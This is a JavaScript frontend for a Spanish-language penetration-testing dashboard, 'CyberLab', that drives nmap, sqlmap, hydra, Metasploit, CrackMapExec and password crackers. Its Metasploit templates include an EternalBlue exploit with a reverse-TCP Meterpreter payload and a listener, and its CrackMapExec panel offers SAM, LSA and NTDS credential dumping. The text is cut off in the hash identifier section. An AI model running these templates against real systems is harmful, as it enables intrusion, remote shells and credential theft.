/* ═══════════════════════════════════════════════════════════════
   CyberLab v2.0 — app.js — Complete Frontend Logic
   ═══════════════════════════════════════════════════════════════ */

const API = '';

// ─── Tool metadata ─────────────────────────────────────────────
const TOOL_META = {
    dashboard:    { title: 'Dashboard',              desc: 'CyberLab Security Research Platform' },
    nmap:         { title: 'Nmap Scanner',           desc: 'Network Exploration & Security Auditing' },
    sqlmap:       { title: 'SQLMap',                 desc: 'SQL Injection Detection & Exploitation' },
    gobuster:     { title: 'Gobuster',               desc: 'Directory · DNS · VHost Fuzzing' },
    nikto:        { title: 'Nikto',                  desc: 'Web Server Vulnerability Scanner' },
    hydra:        { title: 'Hydra',                  desc: 'Network Login Brute Forcer' },
    theharvester: { title: 'theHarvester',           desc: 'OSINT — Emails · Subdomains · IPs' },
    subfinder:    { title: 'Subfinder',              desc: 'Passive Subdomain Enumeration' },
    nuclei:       { title: 'Nuclei',                 desc: '10k+ Template CVE & Vulnerability Scanner' },
    zap:          { title: 'OWASP ZAP',              desc: 'Web Application Security Scanner' },
    metasploit:   { title: 'Metasploit Framework',  desc: 'Exploitation & Post-Exploitation' },
    cme:          { title: 'CrackMapExec',           desc: 'Active Directory · SMB · WinRM Exploitation' },
    enum4linux:   { title: 'enum4linux',             desc: 'Samba/SMB Enumeration' },
    tshark:       { title: 'tshark',                 desc: 'Live Network Packet Capture (Wireshark CLI)' },
    john:         { title: 'John the Ripper',        desc: 'Password Cracking · Dictionary & Incremental' },
    hashcat:      { title: 'Hashcat',                desc: 'GPU-Accelerated Password Recovery' },
    hashid:       { title: 'Hash Identifier',        desc: 'Auto-detect Hash Type → Hashcat/John Mode' },
    encoder:      { title: 'Encoder / Decoder',      desc: 'Base64 · Hex · URL · JWT · ROT13 · Hash' },
    revshell:     { title: 'Reverse Shell Generator',desc: 'One-liners en 15+ lenguajes' },
    payload:      { title: 'Payload Generator',      desc: 'XSS · SQLi · CMDi · SSTI · LFI · XXE · SSRF' },
    wordlists:    { title: 'Wordlist Manager',        desc: 'Navegar y previsualizar wordlists del sistema' },
    cve:          { title: 'CVE Search (NVD)',        desc: 'NIST National Vulnerability Database' },
    history:      { title: 'Historial',              desc: 'Registro persistente de todas las operaciones' },
    rustscan:     { title: 'RustScan',               desc: 'El escáner de puertos más rápido' },
    feroxbuster:  { title: 'Feroxbuster',            desc: 'Fuzzing de directorios recursivo (Rust)' },
    netexec:      { title: 'NetExec (nxc)',          desc: 'Explotación AD / SMB' },
    impacket:     { title: 'Impacket Suite',         desc: 'Suite de scripts de red' },
    bloodhound:   { title: 'BloodHound',             desc: 'Ingestor Python para AD' },
    peass:        { title: 'PEASS-ng',               desc: 'Escalada de privilegios (Lin/Win/Mac)' },
    trufflehog:   { title: 'TruffleHog',             desc: 'Escaneo de secretos' },
    gitleaks:     { title: 'Gitleaks',               desc: 'Detección de secretos en repositorios' },
    gitrob:       { title: 'Gitrob',                 desc: 'Reconocimiento OSINT en Github' },
};

let currentTool = 'nmap';
const activeSources = {};
let selectedHashMode = 0;
let selectedNucleiTags = new Set();
let selectedHarvesterSources = new Set(['google','bing','crtsh','dnsdumpster']);

// ─── Toast Notifications ───────────────────────────────────────
function toast(msg, type = 'info', duration = 3500) {
    const container = document.getElementById('toast-container');
    const t = document.createElement('div');
    t.className = `toast ${type}`;
    t.innerHTML = `<div class="toast-dot"></div><span>${msg}</span>`;
    container.appendChild(t);
    setTimeout(() => {
        t.style.animation = 'toastOut 0.3s ease forwards';
        setTimeout(() => t.remove(), 300);
    }, duration);
}

// ─── Navigation ───────────────────────────────────────────────
function updateTopbar(tool) {
    const meta = TOOL_META[tool] || {};
    document.getElementById('topbar-tool-name').textContent = meta.title || tool;
    document.getElementById('topbar-tool-desc').textContent = meta.desc || '';
}

function switchTool(tool) {
    document.querySelectorAll('.tool-panel').forEach(p => p.classList.remove('active'));
    document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
    const panel = document.getElementById(`panel-${tool}`);
    const navBtn = document.getElementById(`nav-${tool}`);
    if (panel) panel.classList.add('active');
    if (navBtn) navBtn.classList.add('active');
    currentTool = tool;
    updateTopbar(tool);

    // Lazy loads
    if (tool === 'dashboard')  refreshDashboard();
    if (tool === 'history')    loadHistory();
    if (tool === 'wordlists')  loadWordlists();
    if (tool === 'payload')    renderPayloads();
}

// ─── Terminal helpers ─────────────────────────────────────────
function getTerminal(tool) { return document.getElementById(`term-${tool}`); }

function hideEmpty(tool) {
    const e = document.getElementById(`term-${tool}-empty`);
    if (e) e.style.display = 'none';
}

function appendLine(tool, text, cls = '') {
    hideEmpty(tool);
    const term = getTerminal(tool);
    if (!term) return;
    let lc = cls;
    if (!lc) {
        if (text.startsWith('$'))                                lc = 'cmd';
        else if (/\[FOUND\]|\[SUCCESS\]/i.test(text))           lc = 'done';
        else if (/\[CRITICAL\]|\[HIGH\]|error|failed|denied/i.test(text)) lc = 'error';
        else if (/\[MEDIUM\]|\[WARN\]|warning/i.test(text))    lc = 'warn';
        else if (/\[LOW\]|\[INFO\]|\[SUBDOMAIN\]/i.test(text)) lc = 'info';
        else if (/terminado|done|complete|cracked|✓/i.test(text)) lc = 'done';
    }
    const span = document.createElement('span');
    span.className = `term-line${lc ? ' ' + lc : ''}`;
    span.textContent = text;
    term.appendChild(span);
    term.appendChild(document.createTextNode('\n'));
    term.scrollTop = term.scrollHeight;
}

function clearTerminal(tool) {
    const term = getTerminal(tool);
    if (!term) return;
    term.innerHTML = `<div class="terminal-empty" id="term-${tool}-empty"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg><p>Terminal limpiada</p></div>`;
}

function clearAllTerminals() {
    Object.keys(TOOL_META).forEach(t => clearTerminal(t));
    toast('Todos los terminales limpiados', 'info');
}

async function copyTerminal(tool) {
    const term = getTerminal(tool);
    if (!term) return;
    try {
        await navigator.clipboard.writeText(term.innerText);
        toast('Output copiado al portapapeles', 'success');
    } catch { toast('Error al copiar', 'error'); }
}

// ─── SSE Stream (POST JSON) ────────────────────────────────────
async function streamPost(tool, endpoint, body, onProgress) {
    if (activeSources[tool]) activeSources[tool].abort();
    const controller = new AbortController();
    activeSources[tool] = controller;
    appendLine(tool, `Conectando → ${endpoint}`, 'info');
    let res;
    try {
        res = await fetch(endpoint, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body), signal: controller.signal });
    } catch (e) { appendLine(tool, `[ERROR] ${e.message}`, 'error'); return; }
    if (!res.ok) { appendLine(tool, `[ERROR] HTTP ${res.status}`, 'error'); return; }
    await consumeSSE(tool, res, onProgress);
    delete activeSources[tool];
}

// SSE Stream (POST FormData)
async function streamPostForm(tool, endpoint, formData, onProgress) {
    if (activeSources[tool]) activeSources[tool].abort();
    const controller = new AbortController();
    activeSources[tool] = controller;
    appendLine(tool, `Conectando → ${endpoint}`, 'info');
    let res;
    try {
        res = await fetch(endpoint, { method: 'POST', body: formData, signal: controller.signal });
    } catch (e) { appendLine(tool, `[ERROR] ${e.message}`, 'error'); return; }
    if (!res.ok) { appendLine(tool, `[ERROR] HTTP ${res.status}`, 'error'); return; }
    await consumeSSE(tool, res, onProgress);
    delete activeSources[tool];
}

async function consumeSSE(tool, res, onProgress) {
    const reader = res.body.getReader();
    const decoder = new TextDecoder();
    let buf = '';
    while (true) {
        let chunk;
        try { chunk = await reader.read(); } catch { break; }
        if (chunk.done) break;
        buf += decoder.decode(chunk.value, { stream: true });
        const parts = buf.split('\n\n');
        buf = parts.pop();
        for (const part of parts) {
            const evM = part.match(/event:\s*(.+)/);
            const daM = part.match(/data:\s*(.+)/);
            const ev  = evM ? evM[1].trim() : 'output';
            let data = {};
            if (daM) { try { data = JSON.parse(daM[1].trim()); } catch {} }
            if (ev === 'output'   && data.line !== undefined) appendLine(tool, data.line);
            else if (ev === 'start')    appendLine(tool, data.message || '', 'info');
            else if (ev === 'progress' && onProgress) onProgress(data.progress);
            else if (ev === 'done') {
                const code = data.code ?? 0;
                appendLine(tool, `\n[✓] Completado (exit: ${code})`, code === 0 ? 'done' : 'error');
                toast(`${tool} terminado`, code === 0 ? 'success' : 'error');
                updateHistoryBadge();
            }
            else if (ev === 'error')    appendLine(tool, `[ERROR] ${data.message}`, 'error');
        }
    }
}

function stopCurrentProcess(tool) {
    if (activeSources[tool]) {
        activeSources[tool].abort();
        delete activeSources[tool];
        appendLine(tool, '[!] Proceso cancelado', 'warn');
        toast(`${tool} cancelado`, 'info');
    }
}

// ─── Backend Health ────────────────────────────────────────────
async function checkBackendStatus() {
    const pill = document.getElementById('backend-status');
    const txt  = document.getElementById('backend-status-text');
    try {
        const res = await fetch('/api/health', { cache: 'no-store' });
        const d = await res.json();
        pill.className = 'status-pill connected';
        txt.textContent = `Backend v${d.version} · ${d.tools.length} tools`;
    } catch {
        pill.className = 'status-pill disconnected';
        txt.textContent = 'Backend desconectado';
    }
}

async function checkZapStatus() {
    try {
        const r = await fetch('/api/zap/status');
        const d = await r.json();
        const dot = document.getElementById('status-zap');
        if (dot) dot.className = `tool-status ${d.running ? 'online' : 'offline'}`;
    } catch {}
}

// ─── Dashboard ─────────────────────────────────────────────────
async function refreshDashboard() {
    // Stats
    const history = await fetch('/api/history?limit=200').then(r => r.json()).catch(() => []);
    const statsEl = document.getElementById('dashboard-stats');
    const tools = [...new Set(history.map(e => e.tool))];
    const done  = history.filter(e => e.status === 'done').length;
    const errs  = history.filter(e => e.status === 'error').length;
    statsEl.innerHTML = `
        <div class="dash-stat"><div class="dash-stat-num" style="color:var(--green)">${history.length}</div><div class="dash-stat-label">Operaciones totales</div></div>
        <div class="dash-stat"><div class="dash-stat-num" style="color:var(--green)">${done}</div><div class="dash-stat-label">Completadas</div></div>
        <div class="dash-stat"><div class="dash-stat-num" style="color:var(--red)">${errs}</div><div class="dash-stat-label">Con error</div></div>
        <div class="dash-stat"><div class="dash-stat-num" style="color:var(--cyan)">${tools.length}</div><div class="dash-stat-label">Herramientas usadas</div></div>`;

    // Tools status grid
    const tGrid = document.getElementById('tools-status-grid');
    const allTools = ['nmap','rustscan','sqlmap','gobuster','feroxbuster','nikto','hydra','theharvester','subfinder','nuclei','zap','metasploit','cme','netexec','impacket','bloodhound','peass','enum4linux','tshark','john','hashcat','trufflehog','gitleaks','gitrob'];
    tGrid.innerHTML = allTools.map(t => {
        const count = history.filter(e => e.tool === t).length;
        return `<div class="tool-status-chip" onclick="switchTool('${t}')">
            <span class="tool-status online"></span>
            <span style="flex:1;font-weight:600">${t}</span>
            <span style="color:var(--text-muted);font-family:var(--font-mono);font-size:10px">${count}x</span>
        </div>`;
    }).join('');

    // Recent activity
    const ra = document.getElementById('recent-activity');
    if (!history.length) { ra.innerHTML = '<p style="color:var(--text-muted);font-size:12px;padding:8px">Sin actividad registrada</p>'; return; }
    ra.innerHTML = history.slice(0, 20).map(e => {
        const ts = new Date(e.timestamp);
        const timeStr = ts.toLocaleTimeString('es-ES', { hour: '2-digit', minute: '2-digit' });
        return `<div class="activity-item">
            <span class="activity-tool">${e.tool}</span>
            <span class="activity-target">${e.target || e.command || '—'}</span>
            <span class="activity-time">${timeStr}</span>
            <span class="badge ${e.status==='done'?'badge-done':e.status==='error'?'badge-error':'badge-run'}">${e.status}</span>
        </div>`;
    }).join('');
}

// ─── NMAP ─────────────────────────────────────────────────────
async function loadNmapTemplates() {
    try {
        const ts = await fetch('/api/nmap/templates').then(r => r.json());
        const c = document.getElementById('nmap-templates');
        if (!c) return;
        c.innerHTML = '';
        ts.forEach(t => {
            const chip = document.createElement('span');
            chip.className = 'template-chip'; chip.title = t.description; chip.textContent = t.name;
            chip.onclick = () => document.getElementById('nmap-flags').value = t.flags;
            c.appendChild(chip);
        });
    } catch {}
}

async function runNmap() {
    const target = document.getElementById('nmap-target').value.trim();
    const flags  = document.getElementById('nmap-flags').value.trim();
    if (!target) { appendLine('nmap','[!] Introduce un target','warn'); return; }
    const btn = document.getElementById('nmap-run-btn'); btn.disabled = true;
    await streamPost('nmap', '/api/nmap/scan', { target, flags });
    btn.disabled = false;
}

// ─── SQLMAP ───────────────────────────────────────────────────
async function loadSqlmapTechniques() {
    try {
        const ts = await fetch('/api/sqlmap/techniques').then(r => r.json());
        const sel = document.getElementById('sqlmap-technique');
        if (!sel) return;
        ts.forEach(t => {
            const o = document.createElement('option'); o.value = t.id; o.textContent = `${t.id} — ${t.name}`; sel.appendChild(o);
        });
    } catch {}
}

async function runSqlmap() {
    const url = document.getElementById('sqlmap-url').value.trim();
    if (!url) { appendLine('sqlmap','[!] Introduce una URL','warn'); return; }
    const options = {
        level:     document.getElementById('sqlmap-level').value,
        risk:      document.getElementById('sqlmap-risk').value,
        technique: document.getElementById('sqlmap-technique').value || null,
        data:      document.getElementById('sqlmap-data').value.trim() || null,
        cookie:    document.getElementById('sqlmap-cookie').value.trim() || null,
        dbs:       document.getElementById('sqlmap-dbs').checked,
        tables:    document.getElementById('sqlmap-tables').checked,
        dump:      document.getElementById('sqlmap-dump').checked,
        forms:     document.getElementById('sqlmap-forms').checked,
    };
    const btn = document.getElementById('sqlmap-run-btn'); btn.disabled = true;
    await streamPost('sqlmap', '/api/sqlmap/scan', { url, options });
    btn.disabled = false;
}

// ─── GOBUSTER ─────────────────────────────────────────────────
async function loadGobusterWordlists() {
    try {
        const wls = await fetch('/api/gobuster/wordlists').then(r => r.json());
        const c = document.getElementById('gobuster-wordlists');
        if (!c) return;
        c.innerHTML = '';
        wls.forEach(p => {
            const chip = document.createElement('span');
            chip.className = 'template-chip';
            chip.textContent = p.split('/').pop();
            chip.title = p;
            chip.onclick = () => document.getElementById('gobuster-wordlist-path').value = p;
            c.appendChild(chip);
        });
    } catch {}
}

function updateGobusterUI() {}

async function runGobuster() {
    const mode     = document.getElementById('gobuster-mode').value;
    const url      = document.getElementById('gobuster-url').value.trim();
    const wordlist = document.getElementById('gobuster-wordlist-path').value.trim();
    const threads  = document.getElementById('gobuster-threads').value;
    const ext      = document.getElementById('gobuster-ext').value.trim();
    if (!url) { appendLine('gobuster','[!] Introduce una URL','warn'); return; }
    const btn = document.getElementById('gobuster-run-btn'); btn.disabled = true;
    await streamPost('gobuster', '/api/gobuster/fuzz', { mode, url, wordlist: wordlist || null, options: { threads, extensions: ext || null } });
    btn.disabled = false;
}

// ─── NIKTO ────────────────────────────────────────────────────
let selectedNiktoTuning = new Set();

async function loadNiktoTuning() {
    try {
        const ts = await fetch('/api/nikto/tuning').then(r => r.json());
        const c = document.getElementById('nikto-tuning');
        if (!c) return;
        ts.forEach(t => {
            const chip = document.createElement('span');
            chip.className = 'template-chip';
            chip.textContent = `${t.id} · ${t.name}`;
            chip.onclick = () => {
                if (selectedNiktoTuning.has(t.id)) { selectedNiktoTuning.delete(t.id); chip.classList.remove('selected'); }
                else { selectedNiktoTuning.add(t.id); chip.classList.add('selected'); }
            };
            c.appendChild(chip);
        });
    } catch {}
}

async function runNikto() {
    const target = document.getElementById('nikto-target').value.trim();
    if (!target) { appendLine('nikto','[!] Introduce un target','warn'); return; }
    const options = {
        port:    document.getElementById('nikto-port').value || null,
        ssl:     document.getElementById('nikto-ssl').checked,
        tuning:  selectedNiktoTuning.size ? [...selectedNiktoTuning].join('') : null,
    };
    const btn = document.getElementById('nikto-run-btn'); btn.disabled = true;
    await streamPost('nikto', '/api/nikto/scan', { target, options });
    btn.disabled = false;
}

// ─── HYDRA ────────────────────────────────────────────────────
async function loadHydraServices() {
    try {
        const svcs = await fetch('/api/hydra/services').then(r => r.json());
        const sel  = document.getElementById('hydra-service');
        if (!sel) return;
        svcs.forEach(s => {
            const o = document.createElement('option'); o.value = s.id; o.textContent = `${s.name} (:${s.defaultPort})`; sel.appendChild(o);
        });
    } catch {}
}

async function runHydra() {
    const target  = document.getElementById('hydra-target').value.trim();
    const service = document.getElementById('hydra-service').value;
    if (!target || !service) { appendLine('hydra','[!] Target y servicio requeridos','warn'); return; }
    const fd = new FormData();
    fd.append('target', target); fd.append('service', service);
    const opts = {
        username:   document.getElementById('hydra-user').value.trim() || null,
        password:   document.getElementById('hydra-pass').value.trim() || null,
        port:       document.getElementById('hydra-port').value || null,
        threads:    document.getElementById('hydra-threads').value,
        stopOnFirst:document.getElementById('hydra-stop').checked,
        verbose:    document.getElementById('hydra-verbose').checked,
    };
    fd.append('options', JSON.stringify(opts));
    const uf = document.getElementById('hydra-userlist').files[0];
    const pf = document.getElementById('hydra-passlist').files[0];
    if (uf) fd.append('userlist', uf);
    if (pf) fd.append('passlist', pf);
    const btn = document.getElementById('hydra-run-btn'); btn.disabled = true;
    await streamPostForm('hydra', '/api/hydra/attack', fd);
    btn.disabled = false;
}

// ─── THEHARVESTER ─────────────────────────────────────────────
async function loadHarvesterSources() {
    try {
        const srcs = await fetch('/api/theharvester/sources').then(r => r.json());
        const c = document.getElementById('harvester-sources');
        if (!c) return;
        srcs.forEach(s => {
            const chip = document.createElement('span');
            chip.className = `source-chip ${selectedHarvesterSources.has(s) ? 'active' : ''}`;
            chip.textContent = s;
            chip.onclick = () => {
                if (selectedHarvesterSources.has(s)) { selectedHarvesterSources.delete(s); chip.classList.remove('active'); }
                else { selectedHarvesterSources.add(s); chip.classList.add('active'); }
            };
            c.appendChild(chip);
        });
    } catch {}
}

async function runHarvester() {
    const domain = document.getElementById('harvester-domain').value.trim();
    if (!domain) { appendLine('theharvester','[!] Introduce un dominio','warn'); return; }
    const options = {
        limit:    document.getElementById('harvester-limit').value,
        dnsLookup:document.getElementById('harvester-dns').checked,
        takeOver: document.getElementById('harvester-takeover').checked,
    };
    const btn = document.getElementById('harvester-run-btn'); btn.disabled = true;
    await streamPost('theharvester', '/api/theharvester/harvest', { domain, sources: [...selectedHarvesterSources], options });
    btn.disabled = false;
}

// ─── SUBFINDER ────────────────────────────────────────────────
async function runSubfinder() {
    const domain = document.getElementById('subfinder-domain').value.trim();
    if (!domain) { appendLine('subfinder','[!] Introduce un dominio','warn'); return; }
    const options = {
        all:       document.getElementById('subfinder-all').checked,
        recursive: document.getElementById('subfinder-recursive').checked,
        threads:   document.getElementById('subfinder-threads').value,
    };
    const btn = document.getElementById('subfinder-run-btn'); btn.disabled = true;
    await streamPost('subfinder', '/api/subfinder/enumerate', { domain, options });
    btn.disabled = false;
}

// ─── NUCLEI ───────────────────────────────────────────────────
async function loadNucleiTags() {
    try {
        const tags = await fetch('/api/nuclei/tags').then(r => r.json());
        const c = document.getElementById('nuclei-tags');
        if (!c) return;
        tags.forEach(t => {
            const chip = document.createElement('span');
            chip.className = 'template-chip';
            chip.textContent = t.name;
            chip.title = t.tag;
            chip.onclick = () => {
                if (selectedNucleiTags.has(t.tag)) { selectedNucleiTags.delete(t.tag); chip.classList.remove('selected'); }
                else { selectedNucleiTags.add(t.tag); chip.classList.add('selected'); }
            };
            c.appendChild(chip);
        });
    } catch {}
}

async function runNuclei() {
    const target   = document.getElementById('nuclei-target').value.trim();
    const severity = document.getElementById('nuclei-severity').value;
    const rateLimit= document.getElementById('nuclei-rate').value;
    if (!target) { appendLine('nuclei','[!] Introduce un target','warn'); return; }
    const options = {
        tags:      selectedNucleiTags.size ? [...selectedNucleiTags].join(',') : null,
        severity:  severity || null,
        rateLimit: rateLimit || 150,
    };
    const btn = document.getElementById('nuclei-run-btn'); btn.disabled = true;
    await streamPost('nuclei', '/api/nuclei/scan', { target, options });
    btn.disabled = false;
}

// ─── ZAP ──────────────────────────────────────────────────────
async function startZap()         { await streamPost('zap', '/api/zap/start', {}); checkZapStatus(); }
function setZapProgress(pct) {
    const w = document.getElementById('zap-progress-wrap'); const b = document.getElementById('zap-progress-bar'); const l = document.getElementById('zap-progress-label');
    if (!w) return; w.style.display = 'flex'; b.style.width = pct + '%'; l.textContent = pct + '%';
    if (parseInt(pct) >= 100) setTimeout(() => { w.style.display = 'none'; }, 2000);
}
async function runZapSpider()     { const t = document.getElementById('zap-target').value.trim(); if (!t) { appendLine('zap','[!] Introduce URL','warn'); return; } await streamPost('zap','/api/zap/spider',{target:t},setZapProgress); }
async function runZapActiveScan() { const t = document.getElementById('zap-target').value.trim(); if (!t) { appendLine('zap','[!] Introduce URL','warn'); return; } await streamPost('zap','/api/zap/activescan',{target:t},setZapProgress); }
async function loadZapAlerts() {
    const baseurl = document.getElementById('zap-target').value.trim();
    appendLine('zap', 'Cargando alertas...', 'info');
    try { const a = await fetch(`/api/zap/alerts?baseurl=${encodeURIComponent(baseurl)}`).then(r => r.json()); renderZapAlerts(a); appendLine('zap',`[✓] ${a.length} alertas`,'done'); } catch (e) { appendLine('zap', `[ERROR] ${e.message}`, 'error'); }
}
function renderZapAlerts(alerts) {
    const c = document.getElementById('zap-alerts'); const cnt = document.getElementById('zap-alert-count');
    if (!c) return; cnt.textContent = alerts.length; c.innerHTML = '';
    if (!alerts.length) { c.innerHTML = '<p style="color:var(--text-muted);font-size:13px;padding:12px">Sin alertas</p>'; return; }
    const ro = { High:0, Medium:1, Low:2, Informational:3 };
    alerts.sort((a,b) => (ro[a.risk]??9) - (ro[b.risk]??9));
    alerts.forEach(a => {
        const card = document.createElement('div'); card.className = 'alert-card fade-in';
        const rc = { High:'high', Medium:'medium', Low:'low', Informational:'info' }[a.risk] || 'info';
        card.innerHTML = `<div class="alert-card-header"><span class="risk-badge ${rc}">${a.risk}</span><span class="alert-name">${a.name}</span></div><div class="alert-url">${a.url}</div>`;
        c.appendChild(card);
    });
}

// ─── METASPLOIT ───────────────────────────────────────────────
const MSF_TEMPLATES = {
    recon:           'db_nmap -sV 192.168.1.0/24\nsearch type:auxiliary name:scanner',
    smb_ms17:        'use exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS 192.168.1.100\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nset LHOST 192.168.1.1\nset LPORT 4444\ncheck\nrun',
    meterpreter_rev: 'use exploit/multi/handler\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nset LHOST 0.0.0.0\nset LPORT 4444\nrun -j',
    db_nmap:         'db_nmap -sV -O 192.168.1.0/24\nhosts\nservices',
};
function loadMsfTemplate(k) { const t = MSF_TEMPLATES[k]; if (t) document.getElementById('msf-commands').value = t; }
async function searchMsfModules() {
    const q = document.getElementById('msf-search').value.trim(); if (!q) return;
    appendLine('metasploit',`Buscando: "${q}"...`,'info');
    try {
        const ms = await fetch(`/api/metasploit/modules/search?q=${encodeURIComponent(q)}`).then(r => r.json());
        if (!ms.length) { appendLine('metasploit','Sin resultados','warn'); return; }
        appendLine('metasploit',`─── ${ms.length} módulos ───`,'done');
        ms.forEach(m => appendLine('metasploit', `  ${m.name.padEnd(55)} ${m.rank}   ${m.description}`));
    } catch (e) { appendLine('metasploit',`[ERROR] ${e.message}`,'error'); }
}
async function runMetasploit() {
    const raw = document.getElementById('msf-commands').value.trim(); if (!raw) { appendLine('metasploit','[!] Escribe comandos','warn'); return; }
    const commands = raw.split('\n').map(l => l.trim()).filter(Boolean);
    const btn = document.getElementById('msf-run-btn'); btn.disabled = true;
    await streamPost('metasploit', '/api/metasploit/run', { commands });
    btn.disabled = false;
}

// ─── CrackMapExec ─────────────────────────────────────────────
async function loadCMEProtocols() {
    try {
        const ps = await fetch('/api/cme/protocols').then(r => r.json());
        const sel = document.getElementById('cme-protocol'); if (!sel) return;
        ps.forEach(p => { const o = document.createElement('option'); o.value = p.id; o.textContent = `${p.name} — ${p.desc}`; sel.appendChild(o); });
    } catch {}
}
async function runCME() {
    const protocol = document.getElementById('cme-protocol').value;
    const target   = document.getElementById('cme-target').value.trim();
    if (!target) { appendLine('cme','[!] Introduce un target','warn'); return; }
    const options = {
        username: document.getElementById('cme-user').value.trim() || null,
        password: document.getElementById('cme-pass').value.trim() || null,
        hash:     document.getElementById('cme-hash').value.trim() || null,
        domain:   document.getElementById('cme-domain').value.trim() || null,
        shares:   document.getElementById('cme-shares').checked,
        users:    document.getElementById('cme-users').checked,
        groups:   document.getElementById('cme-groups').checked,
        sam:      document.getElementById('cme-sam').checked,
        lsa:      document.getElementById('cme-lsa').checked,
        ntds:     document.getElementById('cme-ntds').checked,
        rid:      document.getElementById('cme-rid').checked,
        command:  document.getElementById('cme-command').value.trim() || null,
    };
    const btn = document.getElementById('cme-run-btn'); btn.disabled = true;
    await streamPost('cme', '/api/cme/run', { protocol, target, options });
    btn.disabled = false;
}

// ─── enum4linux ───────────────────────────────────────────────
async function runEnum4linux() {
    const target = document.getElementById('e4l-target').value.trim();
    if (!target) { appendLine('enum4linux','[!] Introduce una IP','warn'); return; }
    const options = {
        all:     document.getElementById('e4l-all').checked,
        users:   document.getElementById('e4l-users').checked,
        groups:  document.getElementById('e4l-groups').checked,
        shares:  document.getElementById('e4l-shares').checked,
        password:document.getElementById('e4l-policy').checked,
        rid:     document.getElementById('e4l-rid').checked,
        os:      document.getElementById('e4l-os').checked,
        username:document.getElementById('e4l-user').value.trim() || null,
        pass:    document.getElementById('e4l-pass').value.trim() || null,
    };
    const btn = document.getElementById('e4l-run-btn'); btn.disabled = true;
    await streamPost('enum4linux', '/api/enum4linux/enumerate', { target, options });
    btn.disabled = false;
}

// ─── tshark ───────────────────────────────────────────────────
async function loadTsharkInterfaces() {
    try {
        const ifaces = await fetch('/api/tshark/interfaces').then(r => r.json());
        const sel = document.getElementById('tshark-iface'); if (!sel) return;
        ifaces.forEach(i => { const o = document.createElement('option'); o.value = i; o.textContent = i; sel.appendChild(o); });
    } catch {}
}
async function loadTsharkFilters() {
    try {
        const fs = await fetch('/api/tshark/filters').then(r => r.json());
        const c  = document.getElementById('tshark-filters'); if (!c) return;
        fs.forEach(f => {
            const chip = document.createElement('span'); chip.className = 'template-chip';
            chip.textContent = f.name;
            chip.onclick = () => document.getElementById('tshark-filter').value = f.filter;
            c.appendChild(chip);
        });
    } catch {}
}
async function runTshark() {
    const options = {
        interface: document.getElementById('tshark-iface').value || 'any',
        filter:    document.getElementById('tshark-filter').value.trim() || null,
        display:   document.getElementById('tshark-display').value.trim() || null,
        count:     document.getElementById('tshark-count').value || null,
    };
    const btn = document.getElementById('tshark-run-btn'); btn.disabled = true;
    await streamPost('tshark', '/api/tshark/capture', { options });
    btn.disabled = false;
}

// ─── JOHN ─────────────────────────────────────────────────────
async function runJohn() {
    const hf = document.getElementById('john-hashfile').files[0]; if (!hf) { appendLine('john','[!] Sube un hash file','warn'); return; }
    const wf = document.getElementById('john-wordlist').files[0]; const format = document.getElementById('john-format').value;
    const fd = new FormData(); fd.append('hashfile',hf); if (wf) fd.append('wordlist',wf); if (format) fd.append('format',format);
    const btn = document.getElementById('john-run-btn'); btn.disabled = true;
    await streamPostForm('john', '/api/john/crack', fd);
    btn.disabled = false;
}
async function showJohnResults() {
    const hf = document.getElementById('john-hashfile').files[0]; if (!hf) { appendLine('john','[!] Sube hash file','warn'); return; }
    const fd = new FormData(); fd.append('hashfile',hf); const fmt = document.getElementById('john-format').value; if (fmt) fd.append('format',fmt);
    appendLine('john','Leyendo pot file...','info');
    try {
        const r = await fetch('/api/john/show',{method:'POST',body:fd}).then(r=>r.json());
        if (!r.length) { appendLine('john','Sin hashes crackeados todavía','warn'); return; }
        appendLine('john',`─── ${r.length} crackeados ───`,'done');
        r.forEach(x => appendLine('john', `  ${x.hash}  →  ${x.password}`, 'done'));
    } catch (e) { appendLine('john',`[ERROR] ${e.message}`,'error'); }
}

// ─── HASHCAT ─────────────────────────────────────────────────
async function loadHashcatModes() {
    try {
        const ms = await fetch('/api/hashcat/modes').then(r => r.json());
        const g = document.getElementById('hc-modes-grid'); if (!g) return;
        g.innerHTML = '';
        ms.forEach(m => {
            const item = document.createElement('div'); item.className = 'hash-mode-item'; item.dataset.mode = m.mode;
            item.innerHTML = `<div class="hash-mode-num">-m ${m.mode}</div><div class="hash-mode-name">${m.name}</div>`;
            item.onclick = () => { selectedHashMode = m.mode; document.querySelectorAll('.hash-mode-item').forEach(i => i.classList.remove('selected')); item.classList.add('selected'); };
            g.appendChild(item);
        });
    } catch {}
}
function updateHashcatAttackUI() {
    const a = document.getElementById('hc-attack').value;
    document.getElementById('hc-mask-group').style.display = ['3','6','7'].includes(a) ? 'block' : 'none';
}
async function runHashcat() {
    const hf = document.getElementById('hc-hashfile').files[0]; if (!hf) { appendLine('hashcat','[!] Sube un hash file','warn'); return; }
    const wf = document.getElementById('hc-wordlist').files[0];
    const fd = new FormData(); fd.append('hashfile',hf); if (wf) fd.append('wordlist',wf);
    fd.append('mode', selectedHashMode); fd.append('attackMode', document.getElementById('hc-attack').value);
    const mask = document.getElementById('hc-mask').value.trim(); if (mask) fd.append('mask',mask);
    const btn = document.getElementById('hc-run-btn'); btn.disabled = true;
    await streamPostForm('hashcat', '/api/hashcat/crack', fd);
    btn.disabled = false;
}

// ─── HASH IDENTIFIER ─────────────────────────────────────────
async function identifyHash() {
    const hash = document.getElementById('hashid-input').value.trim();
    if (!hash) return;
    try {
        const result = await fetch('/api/hashid/identify', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({ hash }) }).then(r => r.json());
        const c = document.getElementById('hashid-results'); c.innerHTML = '';
        // Info card
        const info = document.createElement('div'); info.className = 'hashid-info';
        info.innerHTML = `<strong>Hash:</strong> ${result.hash.slice(0,60)}${result.hash.length>60?'...':''}<br><strong>Longitud:</strong> ${result.length} chars · ${result.hexLength} hex chars${result.lengthInfo ? `<br><strong>Nota:</strong> ${result.lengthInfo}` : ''}`;
        c.appendChild(info);
        // Matches
        result.matches.forEach(m => {
            const card = document.createElement('div'); card.className = 'hashid-match';
            card.innerHTML = `
                <div style="flex:1">
                    <div class="hashid-match-name">${m.name}</div>
